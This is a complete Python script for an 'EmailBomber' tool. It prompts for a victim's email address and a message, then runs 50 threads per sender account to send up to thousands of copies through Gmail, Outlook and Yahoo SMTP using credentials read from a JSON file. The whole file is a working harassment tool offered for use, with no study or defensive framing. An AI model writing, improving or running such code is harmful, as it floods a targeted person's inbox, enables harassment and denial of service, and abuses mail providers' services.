import smtplib
import time
import os
import random
import string
import threading
import json
from datetime import datetime
from pyfade import Fade, Colors
import platform
from colorama import Fore, init
import sys



banner = '''
               | 
               |
           ,--'#`--.
           |#######|
        _.-'#######`-._
     ,-'###############`-.                ______  ______   ______
   ,'#####################`,             / __/  |/  / _ | /  _/ /
  /#########################\\           / _// /|_/ / __ |_/ // /_
 |###########################|         /___/_/  /_/_/ |_/___/____/
|#############################|
|#############################|     ___  ____  ____  __  ______  _______ 
|#############################|    / _ )/ __ \/ __ \/  |/  / _ )/ __/ _ \\
|#############################|   / _  / /_/ / /_/ / /|_/ / _  / _// , _/
 |###########################|   /____/\____/\____/_/  /_/____/___/_/|_|
  \#########################/
   `.#####################,'                   BY LOTUS01
     `._###############_,'
        `--..#####..--'
'''


def genRdm(lengt):
    lengt = int(lengt)
    result = ('').join(random.choices(string.ascii_letters + string.digits, k=(lengt)))
    return result

def setup():
    print(f"{Fore.RED} [?] Make shure that you activated 'Alow to be used by less secure apps' in the emails settings{Fore.RESET}\n")
    print(f" [!] Please put your emails in {Fore.BLUE}accounts.json{Fore.RESET} with the {Fore.YELLOW}email:pass{Fore.RESET} format before continuing")
    print(f"     Accepted emails are: {Fore.YELLOW}@gmail{Fore.RESET}, {Fore.YELLOW}@outlook{Fore.RESET} and {Fore.YELLOW}@yahoo{Fore.RESET}.")
    victime = input(f"\n\033[36mEnter victime's email\033[35m${Fore.RESET} ")
    msg = input(f"\033[36mEnter message to spam\033[35m${Fore.RESET} ")
    amont = input(f"\033[36mEnter amount to spam\033[35m${Fore.RESET} ")
    print()

    if msg == '':
        msg = genRdm(35)
    if amont == '':
        amont = 5000
    try:
        amont = int(amont)
    except:
        amont = 5000

    return victime, msg, amont

Tamount = 0

def spam(server, amontN, msg, victime, senderMail, senderPass):
    global Tamount
    global amont
    try:
        with smtplib.SMTP_SSL(server, 465) as serverM:
            serverM.login(senderMail, senderPass)
            while Tamount < amontN:
                #try:
                    serverM.sendmail(senderMail, victime, msg)
                    now = datetime.now()
                    dt_string = now.strftime("%H:%M:%S")
                    os.system(f"title EmailBomer by loTus01 ~ Attacking: {victime} ~ Done {Tamount}/{amont} ~ Time {dt_string}")
                    Tamount += 1
                #except:
                #    pass
    except:
        pass

def getAcounts(amont):
    fileAccounts = os.path.dirname(os.path.abspath(__file__)) + "/accounts.json"
    f = open(fileAccounts)
    data = json.load(f)
    accList = data["Accounts"]

    i = 0
    for acca in accList:
        i += 1
    amontN = round(amont/i)
    return amontN, accList

def runTh(amontN, accList, msg, victime):
    iii = 0
    for acca in accList:
        iii += 1
        acca2 = acca.split(':')
        if "@gmail" in acca2[0]:
            server = "smtp.gmail.com"
        elif "@outlook" in acca2[0]:
            server = "smtp-mail.outlook.com"
        elif "@yahoo" in acca2[0]:
            server = "smtp.mail.yahoo.com"
        
        if server:
            try:
                senderMail = acca2[0]
                senderPass = acca2[1]
                for i in range(50):
                    sys.stdout.flush()
                    threaad = threading.Thread(target=spam, args=[server, amontN, msg, victime, senderMail, senderPass])
                    threaad.start()
                    sys.stdout.write(f"\r {Fore.YELLOW}Thread{Fore.RED} " + str(i) + f" {Fore.YELLOW}attacking with {senderMail}...{Fore.RESET}")
                    time.sleep(0.05)
                print()
            except:
                pass

vers = platform.system()
if "dows" in vers:
    os.system("cls")
os.system(f"title EmailBomer by loTus01")

print(Fade.Vertical(Colors.red_to_green, banner))
victime, msg, amont = setup()
amontN, accList = getAcounts(amont)
runTh(amontN, accList, msg, victime)
